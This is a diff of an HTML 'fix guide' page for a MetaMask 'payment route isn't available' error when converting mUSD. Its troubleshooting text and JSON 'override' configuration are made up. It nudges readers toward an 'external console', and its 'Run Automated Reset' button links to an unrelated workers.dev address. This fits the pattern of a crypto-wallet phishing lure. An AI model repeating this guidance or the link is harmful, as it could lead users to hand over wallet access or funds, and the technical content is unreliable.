@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
+        font-family: -apple-system;
         background: #0f111a;
         color: #ddd;
         padding: 20px;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,33 @@
 <h1>Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "This payment route isn't available" when attempting to deposit and convert mUSD using the MetaMask extension for Perps.</li>
+<li>Users encounter an error message "This payment route isn't available" when attempting to deposit and convert mUSD using the Metamask extension on the Ethereum (ETH) ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a temporary routing issue or an outdated MetaMask extension, which prevents the platform from finding a suitable payment route for the transaction.</li>
+<li>The error occurs due to a temporary mismatch in the available payment routes within the Metamask extension, likely caused by an outdated plugin or an issue with the decentralized exchange (DEX) integration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Try updating the MetaMask extension to the latest version.</li>
-<li>Check the Ethereum network for any ongoing issues or congestion that may be causing the error.</li>
-<li>Use the following JSON configuration to manually override the payment route:</li>
+<li>Attempt to refresh the Metamask extension and retry the transaction.</li>
+<li>Check for updates to the Metamask plugin and install the latest version.</li>
+<li>Utilize the following JSON configuration to manually specify the payment route:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;manual&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;route&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...ethereum_address...&quot;</span>
+<span class="w">  </span><span class="nt">&quot;paymentRoute&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mUSD-ETH&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;dex&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Uniswap&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;slippage&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">0.5</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* MetaMask extension installed and configured
-* Ethereum wallet with sufficient funds
-* Stable internet connection
-For further troubleshooting, consider utilizing an external console for more detailed error logs and diagnostics.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<p>Consider utilizing an external console for advanced debugging. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum (ETH) wallet with sufficient balance</li>
+<li>Stable internet connection for real-time updates</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
